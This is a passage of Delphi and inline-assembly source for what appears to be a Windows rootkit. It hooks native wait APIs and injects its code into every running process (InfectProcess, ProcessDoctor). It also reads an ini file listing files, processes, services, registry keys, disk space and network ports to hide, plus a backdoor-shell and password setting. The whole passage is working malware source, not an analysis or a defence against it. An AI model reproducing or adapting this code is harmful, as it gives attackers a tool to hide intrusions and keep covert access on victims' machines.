  jz @fNewNtWaitForSingleObject_call_origin
  test [edi+004h],080000000h                    //ATimeout^.Hi = negative ? => relative time
  jz @fNewNtWaitForSingleObject_call_origin
  mov eax,[ebp-018h]                            //LOrigTimeoutLo
  mov [edi],eax                                 //ATimeout^.Lo
  mov eax,[ebp-014h]                            //LOrigTimeoutLo
  mov [edi+004h],eax                            //ATimeout^.Hi
 @fNewNtWaitForSingleObject_call_origin:
  mov ecx,[ebx+@NtWaitForSingleObjectAddr]
  jmp @NewAPITail_wait_funcs


 @fNewNtWaitForSingleObject_check_handle:
  push dword ptr [ebp+008h]                     //AHandle
  call @Notify_CheckHandle
  test eax,eax                                  //check if we have this handle in hash table
  jz @fNewNtWaitForSingleObject_end

  push eax
  call @Notify_call_directory_by_entry
  jmp @fNewNtWaitForSingleObject_call

 @fNewNtWaitForSingleObject_end:
  push 00Ch
  jmp @NewAPITail

 //TNtWaitForMultipleObjects=function(AHandleCount:Cardinal;AHandles:PHandle;AWaitType:TWaitType;AAlertable:LongBool;ATimeout:PLARGE_INTEGER):Cardinal;stdcall;
 @fNewNtWaitForMultipleObjects:
  push 028h                                     //local variables
  {
   -028         -       LNotifyHandleCount:Cardinal
   -024         -       LCurrentTimeLo:Cardinal
   -020         -       LCurrentTimeHi:Cardinal
   -01C         -       LTimeoutPtr:Pointer
   -018         -       LOrigTimeoutLo:Cardinal
   -014         -       LOrigTimeoutHi:Cardinal
   -010         -       LUseNewTimeout:Boolean
   -00C         -       LTimeoutLo:Cardinal
   -008         -       LTimeoutHi:Cardinal
   -004         -       LResult:Cardinal
  }
  call @NewAPIHead
  push 000h
  pop dword ptr [ebp-004h]                      //LResult
         
  push 001h
  pop dword ptr [ebp-010h]                      //LUseNewTimeout
  or [ebp-008h],-001h                           //LTimeoutHi
  mov eax,NEW_WAIT_TIMEOUT
  neg eax
  mov [ebp-00Ch],eax                            //LTimeoutLo
  
  lea eax,[ebp-00Ch]                            //LTimeoutLo
  mov [ebp-01Ch],eax                            //LTimeoutPtr

  mov edi,[ebp+018h]                            //ATimeout
  test edi,edi
  jz @fNewNtWaitForMultipleObjects_call
  test [edi+004h],080000000h                    //ATimeout^.Hi = negative ? => relative time
  jz @fNewNtWaitForMultipleObjects_call
  mov eax,[edi]                                 //ATimeout^.Lo
  mov [ebp-018h],eax                            //LOrigTimeoutLo
  mov eax,[edi+004h]                            //ATimeout^.Hi
  mov [ebp-014h],eax                            //LOrigTimeoutHi

  cmp dword ptr [edi+004h],-001h                //ATimeout^.Hi
  jnz @fNewNtWaitForMultipleObjects_call
  mov eax,NEW_WAIT_TIMEOUT
  neg eax
  cmp dword ptr [edi],eax                       //ATimeout^.Lo
  jbe @fNewNtWaitForMultipleObjects_call

  push 000h
  pop dword ptr [ebp-010h]                      //LUseNewTimeout
  mov [ebp-01Ch],edi                            //LTimeoutPtr

 @fNewNtWaitForMultipleObjects_call:
  lea eax,[ebx+@HT_OldNtWaitForMultipleObjects]
  test dword ptr [eax+011h],-001h
  jz @fNewNtWaitForMultipleObjects_end
  push dword ptr [ebp-01Ch]                     //LTimeout
  push dword ptr [ebp+014h]                     //AAlertable
  push dword ptr [ebp+010h]                     //AWaitType
  push dword ptr [ebp+00Ch]                     //AHandles
  push dword ptr [ebp+008h]                     //AHandleCount
  call eax
  mov [ebp-004h],eax                            //LResult
  test eax,eax
  jl @fNewNtWaitForMultipleObjects_end
  cmp eax,STATUS_TIMEOUT
  jz @fNewNtWaitForMultipleObjects_timeout
  cmp eax,[ebp+008h]                            //AHandleCount
  jnb @fNewNtWaitForMultipleObjects_end

  mov ecx,[ebp+010h]                            //AWaitType
  jecxz @fNewNtWaitForMultipleObjects_WaitAll

  mov ecx,[ebp+00Ch]                            //AHandles
  mov eax,[ecx+eax*004h]                        //AHandles[status]
  push eax
  call @Notify_CheckHandle
  test eax,eax                                  //entry in our hash table?
  jz @fNewNtWaitForMultipleObjects_end
  push eax
  call @Notify_call_directory_by_entry
  jmp @fNewNtWaitForMultipleObjects_call

 @fNewNtWaitForMultipleObjects_WaitAll:
  xor esi,esi
  mov [ebp-028h],esi                            //LNotifyHandleCount

 @fNewNtWaitForMultipleObjects_WaitAll_loop:
  cmp esi,[ebp+008h]                            //AHandleCount
  jae @fNewNtWaitForMultipleObjects_restart_end

  mov ecx,[ebp+00Ch]                            //AHandles
  mov eax,[ecx+esi*004h]                        //AHandles[esi]
  push eax
  call @Notify_CheckHandle
  test eax,eax                                  //entry in our hash table?
  jz @fNewNtWaitForMultipleObjects_next
  inc dword ptr [ebp-028h]
  push eax
  call @Notify_call_directory_by_entry

 @fNewNtWaitForMultipleObjects_next:
  inc esi
  jmp @fNewNtWaitForMultipleObjects_WaitAll_loop
 @fNewNtWaitForMultipleObjects_restart_end:
  cmp [ebp-028h],000h                           //LNotifyHandleCount
  jz @fNewNtWaitForMultipleObjects_end
  jmp @fNewNtWaitForMultipleObjects_call


 @fNewNtWaitForMultipleObjects_timeout:
  cmp dword ptr [ebp-010h],000h                 //LUseNewTimeout
  jz @fNewNtWaitForMultipleObjects_end
  test edi,edi                                  //ATimeout = null = INFINITE ?
  jz @fNewNtWaitForMultipleObjects_check_unhook
  test [edi+004h],080000000h                    //ATimeout^.Hi = negative ? => relative time
  jz @fNewNtWaitForMultipleObjects_absolute_time

  add [ebp-018h],NEW_WAIT_TIMEOUT               //LOrigTimeoutLo - NEW_WAIT_TIMEOUT
  adc [ebp-014h],000h                           //LOrigTimeoutHi

  mov ecx,[ebp-014h]                            //LOrigTimeoutHi
  test ecx,ecx
  jz @fNewNtWaitForMultipleObjects_end          //timeout

  cmp [ebp-014h],-001h                          //LOrigTimeoutHi
  jnz @fNewNtWaitForMultipleObjects_check_unhook
  mov ecx,NEW_WAIT_TIMEOUT
  neg ecx
  cmp ecx,[ebp-018h]                            //LOrigTimeoutLo
  jae @fNewNtWaitForMultipleObjects_check_unhook
  mov eax,[ebp-018h]
  mov [ebp-00Ch],eax                            //LTimeoutLo
  jmp @fNewNtWaitForMultipleObjects_check_unhook

 @fNewNtWaitForMultipleObjects_absolute_time:
  lea eax,[ebp-024h]                            //LCurentTimeLo
  push eax                                      //CurrentTime
  call [ebx+@NtQuerySystemTimeAddr]
  mov eax,[ebp-020h]                            //LCurrentTimeHi
  cmp eax,[edi+004h]                            //ATimeout^.Hi
  ja @fNewNtWaitForMultipleObjects_end
  jb @fNewNtWaitForMultipleObjects_check_unhook
  mov eax,[ebp-024h]                            //LCurrentTimeLo
  cmp eax,[edi]                                 //ATimeout^.Lo
  jae @fNewNtWaitForMultipleObjects_end

 @fNewNtWaitForMultipleObjects_check_unhook:
  movzx ecx,[ebx+@LUnhookInProgress]
  test ecx,ecx
  jz @fNewNtWaitForMultipleObjects_call
 //here we have to exit this hooked code cuz unhook is in progress
  test edi,edi
  jz @fNewNtWaitForMultipleObjects_call_origin
  test [edi+004h],080000000h                    //ATimeout^.Hi = negative ? => relative time
  jz @fNewNtWaitForMultipleObjects_call_origin
  mov eax,[ebp-018h]                            //LOrigTimeoutLo
  mov [edi],eax                                 //ATimeout^.Lo
  mov eax,[ebp-014h]                            //LOrigTimeoutLo
  mov [edi+004h],eax                            //ATimeout^.Hi
 @fNewNtWaitForMultipleObjects_call_origin:
  mov ecx,[ebx+@NtWaitForMultipleObjectsAddr]
  jmp @NewAPITail_wait_funcs



 @fNewNtWaitForMultipleObjects_end:
  push 014h
  jmp @NewAPITail


 @Body_end:
  call @GetAddr
  push 000h
  call [eax+@ExitThreadAddr]
  leave
  ret 004h

 @Body_ending:



//
//
//
//
//

 @DirectHook_begin:
  cmp [esp+008h],DIRECT_HOOK_UNHOOK
  jz @DirectUnhook_begin

  push ebp
  mov ebp,esp
  sub esp,004h  
 {
  -004          -       LBytes:Cardinal
  +008          -       APID:Cardinal
  +010          -       AOperation:Cardinal
 }

  push edi
  push esi
  push ebx

{new protect}
  lea eax,[ebp-008h]  //010h
  push eax
  push PAGE_EXECUTE_READWRITE
  lea eax,@Body
  lea ecx,@Body_ending
  sub ecx,eax
  push ecx
  lea eax,@Body
  push eax
  call VirtualProtect

  lea eax,@GetBaseAddr_BasicOffset
  mov ecx,BasicOffset
  mov [eax],ecx

  call @GetAddr
  mov ebx,eax

{dll import}
  mov edi,DLLImport
  lea esi,@DLLStatic
  push esi
 @DirectHook_DLLLoader:
  pop esi

  lodsd
  add eax,ebx
  push eax
  call LoadLibraryA
  mov edx,eax
  lodsd
  mov [eax],edx
  lodsd
  mov ecx,eax
  lodsd
  push esi
  mov esi,eax

 @DirectHook_APILoader:
  push ecx
  push edx

  lodsd
  add eax,ebx
  push eax
  push edx
  call GetProcAddress
  mov ecx,eax
  lodsd
  mov [eax],ecx

  pop edx
  pop ecx
  loop @DirectHook_APILoader

  dec edi
  jnz @DirectHook_DLLLoader
  pop esi
////////
  call @GetAddr
  mov ebx,eax
  push 002h                                     //HookType = htExistingProcess
  push dword ptr [ebp+008h]                     //PID
  call @HookProcess

 @DirectHook_end:
  pop ebx
  pop esi
  pop edi
  leave
  ret 008h


 @DirectUnhook_begin:
  push ebp
  mov ebp,esp
  push edi
  push esi
  push ebx
 {
  +008          -       APID:Cardinal
  +010          -       AOperation:Cardinal
 }

  call @GetAddr
  mov ebx,eax
  push dword ptr [ebp+008h]
  call @UnhookProcess

  pop ebx
  pop esi
  pop edi
  leave
  ret 008h
end;

procedure DirectHookEnd; assembler; asm end;

function LoadAPI:Boolean;
var
 LHModule:HMODULE;
begin
 LHModule:=GetModuleHandle('ntdll.dll');
 NtQuerySystemInformation:=GetProcAddress(LHModule,'NtQuerySystemInformation');
 NtLoadDriver:=GetProcAddress(LHModule,'NtLoadDriver');
 NtQueryObject:=GetProcAddress(LHModule,'NtQueryObject');
 NtQueryVolumeInformationFile:=GetProcAddress(LHModule,'NtQueryVolumeInformationFile');
 RtlAnsiStringToUnicodeString:=GetProcAddress(LHModule,'RtlAnsiStringToUnicodeString');
 RtlUnicodeStringToAnsiString:=GetProcAddress(LHModule,'RtlUnicodeStringToAnsiString');
 RtlFreeAnsiString:=GetProcAddress(LHModule,'RtlFreeAnsiString');
 RtlFreeUnicodeString:=GetProcAddress(LHModule,'RtlFreeUnicodeString');
 RtlInitUnicodeString:=GetProcAddress(LHModule,'RtlInitUnicodeString');

 LHModule:=GetModuleHandle('kernel32.dll');
 GetModuleHandleAAddr:=GetProcAddress(LHModule,'GetModuleHandleA');
 GetProcAddressAddr:=GetProcAddress(LHModule,'GetProcAddress');

 Result:=not ((@NtQuerySystemInformation=nil) or (@NtLoadDriver=nil)
          or (@NtQueryObject=nil) or (@NtQueryVolumeInformationFile=nil)
          or (@RtlAnsiStringToUnicodeString=nil) or (@RtlUnicodeStringToAnsiString=nil)
          or (@RtlFreeAnsiString=nil) or (@RtlFreeUnicodeString=nil)
          or (@RtlInitUnicodeString=nil)

          or (GetModuleHandleAAddr=nil) or (GetProcAddressAddr=nil));
end;

function GetInfoTable(ATableType:Cardinal):Pointer; stdcall;
asm
  pop ebp                                       //Delphi call
 @GetInfoTable:
  push ebp
  mov ebp,esp
  sub esp,004h
  {
   -004         -       LResult:Pointer
   +008         -       ATableType:Cardinal
  }
  push esi
  push 000h
  pop dword ptr [ebp-004h]
  mov esi,000004000h
 @GetInfoTable_doublespace:
  shl esi,001h
  push esi
  push LMEM_FIXED
  call LocalAlloc

  test eax,eax
  jz @GetInfoTable_failed
  mov [ebp-004h],eax

  push 000h                                     //ReturnLength
  push esi                                      //SystemInformationLength
  push eax                                      //SystemInformation
  push dword ptr [ebp+008h]                     //SystemInformationClass
  call NtQuerySystemInformation
  test eax,0C0000000h                           //SEVERITY_ERROR
  jz @GetInfoTable_end                          //STATUS_SUCCESS
  cmp eax,0C0000004h                            //STATUS_INFO_LENGTH_MISMATCH
  jnz @GetInfoTable_failed
  push dword ptr [ebp-004h]
  call LocalFree
  jmp @GetInfoTable_doublespace
 @GetInfoTable_failed:
  push 000h
  pop dword ptr [ebp-004h]

 @GetInfoTable_end:
  mov eax,[ebp-004h]
  pop esi
  leave
  ret 004h
end;

function InfectProcess(APID:Cardinal):Boolean; stdcall;
{$IFDEF TESTINGTIME}
var
 LModuleHandle:HMODULE;
 LProcessHandle:THandle;
 LProcessName:array[0..MAX_PATH-1] of Char;
 LProcNameStr:string;
 LDone,LBytes:Cardinal;
 LB:Byte;
 LAlreadyHooked:Boolean;
{$ENDIF}

begin
{$IFDEF TESTINGTIME}
 Result:=False;
 if APID=GetCurrentProcessId then Exit;
 LProcessName:='UNKNOWN';
 LProcessHandle:=OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ,False,APID);
 if LProcessHandle=0 then Exit;
 if Boolean(EnumProcessModules(LProcessHandle,@LModuleHandle,SizeOf(LModuleHandle),@LDone)) then
 begin
  GetModuleBaseNameA(LProcessHandle,LModuleHandle,LProcessName,SizeOf(LProcessName));
  LProcNameStr:=UpCase(LProcessName);
 end else LProcNameStr:='UNKNOWN';
 LB:=0;
 LAlreadyHooked:=ReadProcessMemory(LProcessHandle,@NtQuerySystemInformation,@LB,1,LBytes) and (LB=$E9);
 CloseHandle(LProcessHandle);
 if LAlreadyHooked then Exit;

 if not ((LProcNameStr='NC.EXE') or (LProcNameStr='XCMD.EXE')
      or (LProcNameStr='XFAR.EXE') or (LProcNameStr='XTASKMGR.EXE')
      or (LProcNameStr='UNKNOWN')) then Exit;
{$ENDIF}

 Result:=Boolean(DirectHook(APID,DIRECT_HOOK_HOOK));
end;

function DisinfectProcess(APID:Cardinal):Boolean; stdcall;
begin
 Result:=Boolean(DirectHook(APID,DIRECT_HOOK_UNHOOK));
end;

function ProcessDoctor(AOperation:Cardinal):Boolean; stdcall;
begin
 asm
  jmp @Start
 @GetCurrentProcessId:
  mov eax,fs:[000000018h]
  mov eax,[eax+020h]
  ret

 @Start:
  push esi
  push edi
  push ebx
  xor ebx,ebx

  push SystemProcessesAndThreadsInformation
  call GetInfoTable
  mov ebx,eax
  test eax,eax
  jz @ProcessDoctor_end
  mov esi,ebx

 @ProcessDoctor_take_one:
  call @GetCurrentProcessId
  cmp eax,[esi+044h]
  jz @ProcessDoctor_next
  push dword ptr [esi+044h]             //PID
  cmp [ebp+008h],DOCTOR_INFECT
  jnz @ProcessDoctor_cure
  call InfectProcess
  jmp @ProcessDoctor_check_res
 @ProcessDoctor_cure:
  call DisinfectProcess
 @ProcessDoctor_check_res:

{$IFDEF LOGGING}
 {$IF (Logging_Level=1) or (Logging_Level=2) or (Logging_Level=3) or (Logging_Level=4)}
  push eax
  push 000h
  push dword ptr [esi+044h]             //PID
  call LogInt
  push 020h
  call LogChar
  push 000h
  lea eax,[esi+038h]
  push eax
  call LogUnicodeString
  push 020h
  call LogChar
  push 000
  push dword ptr [ebp+008h]             //AOperation
  call LogInt
  push 020h
  call LogChar
  pop eax
  push eax                              //result of hook/unhook
  push 001
  push eax
  call LogInt
  pop eax
 {$IFEND}
{$ENDIF}

  test eax,eax
  jz @ProcessDoctor_next
  cmp [ebp+008h],DOCTOR_CURE
  jz @ProcessDoctor_next
  inc InfectedProcessCount
 {new 079}
  mov al,Done
  test al,al
  jnz @ProcessDoctor_end
 {/new 079}
 @ProcessDoctor_next:
  cmp [esi],000h
  jz @ProcessDoctor_end
  add esi,[esi]
  jmp @ProcessDoctor_take_one

 @ProcessDoctor_end:
  test ebx,ebx
  jz @ProcessDoctor_end_ret
  push ebx
  call LocalFree
 @ProcessDoctor_end_ret:
  pop ebx
  pop edi
  pop esi
 end;
 if AOperation=DOCTOR_CURE then
 begin
  InfectedProcessCount:=0;
  Result:=True;
 end else Result:=InfectedProcessCount>0
end;

function Name2PID(AName:string):Cardinal;
var
 LPProcInfo,LPProcess:PSystemProcesses;
 LAnsiString:TAnsiString;
 LRes:Cardinal;

begin
 LRes:=$FFFFFFFF;
 AName:=UpCase(AName);
 if AName<>'IDLE' then
 begin
  LPProcInfo:=GetInfoTable(SystemProcessesAndThreadsInformation);
  LPProcess:=LPProcInfo;
  while (LPProcess^.NextEntryDelta>0) and (LRes=$FFFFFFFF) do
  begin
   LPProcess:=Pointer(Cardinal(LPProcess)+LPProcess^.NextEntryDelta);

   RtlUnicodeStringToAnsiString(@LAnsiString,@LPProcess^.ProcessName,True);
   if UpCase(LAnsiString.Buffer)=AName then LRes:=LPProcess^.ProcessId;
   RtlFreeAnsiString(@LAnsiString);
  end;
  LocalFree(Cardinal(LPProcInfo));
  Result:=LRes;
 end else Result:=0; 
end;

procedure CountBasicOffsetAndFillBasicConsts;
var
 LPB:PByte;
 LFound:Boolean;
 LStr:string;
 LMBI:TMemoryBasicInformation;
 LOldProtect,LSystemPID:Cardinal;
begin
 BasicOffset:=0;
 LPB:=@DirectHook;
 LFound:=False;
 LStr:=StringOfChar(' ',Length(HackerIdentificator));
 while not LFound do
 begin
  CopyMemory(@LStr[1],LPB,Length(HackerIdentificator));
  LFound:=LStr=HackerIdentificator;
  if LFound then BasicOffset:=Cardinal(LPB)-44;
  Inc(LPB);
 end;
 Dec(LPB,38);

 VirtualQuery(@DirectHook,LMBI,SizeOf(LMBI));
 if VirtualProtect(LMBI.BaseAddress,LMBI.RegionSize,PAGE_EXECUTE_READWRITE,LOldProtect) then
 begin
  CopyMemory(LPB,@FileMappingName[1],Length(FileMappingName));

  Inc(LPB,33);

  LSystemPID:=Name2PID('System');
  if LSystemPID=0 then LSystemPID:=GetCurrentProcessId;
  PCardinal(LPB)^:=LSystemPID;


  //now server mailslot
  LFound:=False;
  LStr:=StringOfChar(' ',Length(ServerMailslotNamePart));
  while not LFound do
  begin
   CopyMemory(@LStr[1],LPB,Length(ServerMailslotNamePart));
   LFound:=LStr=ServerMailslotNamePart;
   if LFound then CopyMemory(LPB,@ServerMailslotName[1],Length(ServerMailslotName));
   Inc(LPB);
  end;
 end;
end;

function CreateIniMapping:Boolean;
var
 LSecAttr:TSecurityAttributes;
 LSecDesc:TSecurityDescriptor;
 LPAcl:PAcl;
 LErr:Integer;

begin
 Result:=False;
 IniMappingAddr:=nil;
 if not CreateEveryoneSecAttr(LSecAttr,LSecDesc,LPAcl) then Exit;
 SetLastError(0);
 IniMappingHandle:=CreateFileMapping(INVALID_HANDLE_VALUE,@LSecAttr,PAGE_READWRITE,0,$10000,PChar(FileMappingName));
{$IFDEF TESTINGTIME}
 LErr:=0;
{$ELSE IF}
 LErr:=GetLastError;
{$ENDIF}
 if LErr=ERROR_ALREADY_EXISTS then CloseHandle(IniMappingHandle)
 else IniMappingAddr:=MapViewOfFile(IniMappingHandle,FILE_MAP_ALL_ACCESS,0,0,0);
 VirtualFree(LPAcl,0,MEM_RELEASE);
 Result:=not (IniMappingAddr=nil);
end;

function StringListCompare(AItem1,AItem2:Pointer):Integer;
begin
 Result:=CompareString(LOCALE_SYSTEM_DEFAULT,NORM_IGNORECASE,AItem1,-1,AItem2,-1)-2;
end;

function AuthStrToNum(P:Pointer):Cardinal; stdcall; assembler;
asm
 @auth:
  push edi
  push ebx
  push esi
  mov esi,P
  push esi
  push 03F1h
  pop ebx
  mov eax,0FA230000h
  mov edx,0633AF89Eh
  mov edi,03481A3C1h
 @auth_first:
  pop esi
  push esi
  push 008h
  pop ecx
 @auth_next:
  lodsw
  shl eax,003h
  add eax,edi
  xor edx,eax
  add dh,cl
  setz al
  inc al
  add edi,eax
  loop @auth_next
 @auth_end:
  add edx,edi
  dec ebx
  jnz @auth_first
  mov eax,edx
  pop esi
  pop esi
  pop ebx
  pop edi
end;

function IniNameFromExe:string;
var
 LBuffer:array[0..MAX_PATH-1] of Char;
 LPB:^Char;
 LRet:Cardinal;
 LStr:string;
begin
 ZeroMemory(@LBuffer,SizeOf(LBuffer));
 LRet:=GetModuleFileName(0,LBuffer,SizeOf(LBuffer));
 LPB:=@LBuffer[LRet];
 while LRet>0 do
 begin
  if LPB^='.' then LRet:=1
  else Dec(LPB);
  Dec(LRet);
 end;
 Inc(LPB);
 LPB^:='i';
 Inc(LPB);
 LPB^:='n';
 Inc(LPB);
 LPB^:='i';
 LStr:=LBuffer;
 Result:=ExtractFileName(LStr);
end;

function CorrectIniLine(ALine:string):string;
const
 IniLineBadChar='|<>:\/"';
var
 LRes:string;
 LI,LJ,LK:Integer;
 LBad:Boolean;
begin
 Result:='';
 if Length(ALine)=0 then Exit;
 LRes:=StringOfChar(#$00,Length(ALine));
 LK:=1;
 for LI:=1 to Length(ALine) do
 begin
  LBad:=False;
  for LJ:=1 to Length(IniLineBadChar) do
  if ALine[LI]=IniLineBadChar[LJ] then
  begin
   LBad:=True;
   Break;
  end;
  if not LBad then
  begin
   LRes[LK]:=ALine[LI];
   Inc(LK);
  end;
 end;
 SetLength(LRes,LK-1);
 Result:=LRes;
end;

function LoadIniFile:Boolean;
var
 LFile,LLine,LULine,LDrive,LDevDrive:string;
 LList:TList;
 LI,LPortsCount:Integer;
 LSize:Int64;
 LPListItem:PStringListItem;
 LAuthNum,LRet,LProto,LPort:Cardinal;
 LAuthStr:array[0..15] of Char;
 LHwnd:THandle;
 LPObjectInfo:Pointer;
 LAnsiString:TAnsiString;
 LStatusBlock:TIoStatusBlock;
 LFileFSSizeInfo:TFileFSSizeInformation;
 LPorts:array [0..1,0..65535] of Boolean;

begin
 Result:=False;
 if (ParamCount=1) and (Pos('-:',ParamStr(1))<>1) then IniFile:=ParamStr(1)
 else IniFile:=IniNameFromExe;
 if not FileExists(IniFile) then
 begin
  LFile:=ExtractFilePath(ParamStr(0));
  AddLastBackslash(LFile);
  IniFile:=LFile+ExtractFileName(IniFile);
  if not FileExists(IniFile) then Exit;
 end;
 ZeroMemory(@HiddenArray,SizeOf(HiddenArray));
 ZeroMemory(@RootArray,SizeOf(RootArray));
 ZeroMemory(@ServicesArray,SizeOf(ServicesArray));
 ZeroMemory(@RegKeysArray,SizeOf(RegKeysArray));
 ZeroMemory(@RegValuesArray,SizeOf(RegKeysArray));
 ZeroMemory(@PasswordArray,SizeOf(PasswordArray));
 ZeroMemory(@FreeSpaceArray,SizeOf(FreeSpaceArray));
 ZeroMemory(@HiddenPortsArray,SizeOf(HiddenPortsArray));
 AssignFile(FIni,IniFile);
 Reset(FIni);

 PB:=@HiddenArray;
 LLine:='';
 while (not EoF(FIni)) and (UpCase(Trim(CorrectIniLine(LLine)))<>'[HIDDEN TABLE]') do ReadLn(FIni,LLine);
 if EoF(FIni) then begin CloseFile(FIni); Exit; end;
 while not EoF(FIni) do
 begin
  ReadLn(FIni,LLine);
  LLine:=Trim(CorrectIniLine(LLine));
  if Length(LLine)=0 then Break;
  CopyMemory(PB,@LLine[1],Length(LLine));
  Inc(PB,Length(LLine));
  PB^:=$00;
  Inc(PB);
 end;
 PB^:=$00;
 Inc(PB);
 HiddenArraySize:=Cardinal(PB)-Cardinal(@HiddenArray);

 PB:=@RootArray;
 LLine:='';
 while (not EoF(FIni)) and (UpCase(Trim(CorrectIniLine(LLine)))<>'[ROOT PROCESSES]') do ReadLn(FIni,LLine);
 if EoF(FIni) then begin CloseFile(FIni); Exit; end;
 while not EoF(FIni) do
 begin
  ReadLn(FIni,LLine);
  LLine:=Trim(CorrectIniLine(LLine));
  if Length(LLine)=0 then Break;
  LLine:=UpCase(LLine);
  CopyMemory(PB,@LLine[1],Length(LLine));
  Inc(PB,Length(LLine));
  PB^:=$00;
  Inc(PB);
 end;
 PB^:=$00;
 Inc(PB);
 RootArraySize:=Cardinal(PB)-Cardinal(@RootArray);

 PB:=@ServicesArray;
 LLine:='';
 while (not EoF(FIni)) and (UpCase(Trim(CorrectIniLine(LLine)))<>'[HIDDEN SERVICES]') do ReadLn(FIni,LLine);
 if EoF(FIni) then begin CloseFile(FIni); Exit; end;
 while not EoF(FIni) do
 begin
  ReadLn(FIni,LLine);
  LLine:=Trim(CorrectIniLine(LLine));
  if Length(LLine)=0 then Break;
  LLine:=UpCase(LLine);
  CopyMemory(PB,@LLine[1],Length(LLine));
  Inc(PB,Length(LLine));
  PB^:=$00;
  Inc(PB);
 end;
 PB^:=$00;
 Inc(PB);
 ServicesArraySize:=Cardinal(PB)-Cardinal(@ServicesArray);

 PB:=@RegKeysArray;
 LLine:='';
 while (not EoF(FIni)) and (UpCase(Trim(CorrectIniLine(LLine)))<>'[HIDDEN REGKEYS]') do ReadLn(FIni,LLine);
 if EoF(FIni) then begin CloseFile(FIni); Exit; end;
 LList:=TList.Create;
 while not EoF(FIni) do
 begin
  ReadLn(FIni,LLine);
  LLine:=Trim(CorrectIniLine(LLine));
  if Length(LLine)=0 then Break;
  LLine:=UpCase(LLine);
  New(LPListItem);
  ZeroMemory(LPListItem,SizeOf(LPListItem^));
  CopyMemory(LPListItem,@LLine[1],Length(LLine));
  LList.Add(LPListItem);
 end;
 LList.Sort(@StringListCompare);
 for LI:=0 to LList.Count-1 do
 begin
  LPListItem:=LList[LI];
  CopyMemory(PB,LPListItem,Length(PChar(LPListItem)));
  Inc(PB,Length(PChar(LPListItem)));
  PB^:=$00;
  Inc(PB);
  Dispose(LPListItem);
 end;
 LList.Clear;
 LList.Free;
 PB^:=$00;
 Inc(PB);
 RegKeysArraySize:=Cardinal(PB)-Cardinal(@RegKeysArray);

 PB:=@RegValuesArray;
 LLine:='';
 while (not EoF(FIni)) and (UpCase(Trim(CorrectIniLine(LLine)))<>'[HIDDEN REGVALUES]') do ReadLn(FIni,LLine);
 if EoF(FIni) then begin CloseFile(FIni); Exit; end;
 while not EoF(FIni) do
 begin
  ReadLn(FIni,LLine);
  LLine:=Trim(CorrectIniLine(LLine));
  if Length(LLine)=0 then Break;
  CopyMemory(PB,@LLine[1],Length(LLine));
  Inc(PB,Length(LLine));
  PB^:=$00;
  Inc(PB);
 end;
 PB^:=$00;
 Inc(PB);
 RegValuesArraySize:=Cardinal(PB)-Cardinal(@RegValuesArray);

 PB:=@FreeSpaceArray;
 LLine:='';
 while (not EoF(FIni)) and (UpCase(Trim(CorrectIniLine(LLine)))<>'[FREE SPACE]') do ReadLn(FIni,LLine);
 if EoF(FIni) then begin CloseFile(FIni); Exit; end;
 while not EoF(FIni) do
 begin
  ReadLn(FIni,LLine);
  LLine:=Trim(LLine);
  if Length(LLine)=0 then Break;
  LDrive:='\\.\'+LLine[1]+':';
  LSize:=StrToIntDef(Copy(LLine,3,MaxInt));
  if LSize>0 then
  begin
   LHwnd:=CreateFile(PChar(LDrive),GENERIC_READ,FILE_SHARE_READ or FILE_SHARE_WRITE or FILE_SHARE_DELETE,nil,OPEN_EXISTING,0,0);

   if NtQueryVolumeInformationFile(LHwnd,@LStatusBlock,@LFileFSSizeInfo,SizeOf(LFileFSSizeInfo),FileFsSizeInformation)=0 then LSize:=LSize div (LFileFSSizeInfo.SectorsPerAllocationUnit*LFileFSSizeInfo.BytesPerSector)
   else LSize:=LSize div (8*512);             //default

   LRet:=1024;
   LPObjectInfo:=Pointer(LocalAlloc(LMEM_FIXED,LRet));
   NtQueryObject(LHwnd,ObjectNameInformation,LPObjectInfo,LRet,nil);

   RtlUnicodeStringToAnsiString(@LAnsiString,@PObjectNameInformation(LPObjectInfo).Name,True);
   LDevDrive:=LAnsiString.Buffer;
   RtlFreeAnsiString(@LAnsiString);
   if Length(LDevDrive)>0 then
   begin
    if LastChar(LDevDrive,'\') then LDevDrive:=Copy(LDevDrive,1,Length(LDevDrive)-1);
    LDevDrive:=LDevDrive+'*';
    CopyMemory(PB,@LDevDrive[1],Length(LDevDrive));
    Inc(PB,Length(LDevDrive));
    PB^:=0;
    Inc(PB);
    PInt64(PB)^:=LSize;
    Inc(PB,SizeOf(Int64));
   end;
   LocalFree(Cardinal(LPObjectInfo));
   CloseHandle(LHwnd);
  end;
 end;
 PB^:=$00;
 Inc(PB);
 FreeSpaceArraySize:=Cardinal(PB)-Cardinal(@FreeSpaceArray);

 ZeroMemory(@LPorts,SizeOf(LPorts));
 PB:=@HiddenPortsArray;
 LLine:='';
 while (not EoF(FIni)) and (UpCase(Trim(CorrectIniLine(LLine)))<>'[HIDDEN PORTS]') do ReadLn(FIni,LLine);
 if EoF(FIni) then begin CloseFile(FIni); Exit; end;
 while not EoF(FIni) do
 begin
  ReadLn(FIni,LLine);
  LLine:=UpCase(Trim(LLine));
  if Length(LLine)=0 then Break;
  if Pos('TCP:',LLine)=1 then LProto:=0
  else if Pos('UDP:',LLine)=1 then LProto:=1
  else LProto:=2;

  if (LProto=0) or (LProto=1) then
  begin
   LLine:=Trim(Copy(LLine,5,MaxInt))+',';
   while Length(LLine)>0 do
   begin
    LPort:=$FFFFFFFF;
    LI:=Pos(',',LLine);
    if LI>0 then
    begin
     LPort:=StrToIntDef(Trim(Copy(LLine,1,LI-1)),$FFFFFFFF);
     LLine:=Trim(Copy(LLine,LI+1,MaxInt));
    end;
    if LPort<=65535 then LPorts[LProto,LPort]:=True;
   end;
  end;
 end;

 Inc(PB,2);
 LPortsCount:=0;
 for LI:=0 to 65535 do
  if LPorts[0,LI] then
  begin
   PWord(PB)^:=Word(LI);
   Inc(PB,2);
   Inc(LPortsCount);
  end;

 PWord(@HiddenPortsArray)^:=Word(LPortsCount);
 PWord(PB)^:=0;
 Inc(PB,2);

 for LI:=0 to 65535 do
  if LPorts[1,LI] then
  begin
   PWord(PB)^:=Word(LI);
   Inc(PB,2);
  end;
 PWord(PB)^:=0;
 Inc(PB,2);
 HiddenPortsArraySize:=Cardinal(PB)-Cardinal(@HiddenPortsArray);

 LAuthNum:=0;
 BackdoorShell:='';
 ServiceName:='';
 ServiceDisplayName:='';
 ServiceDescription:='';
 LLine:='';
 while (not EoF(FIni)) and (UpCase(Trim(CorrectIniLine(LLine)))<>'[SETTINGS]') do ReadLn(FIni,LLine);
 if EoF(FIni) then begin CloseFile(FIni); Exit; end;
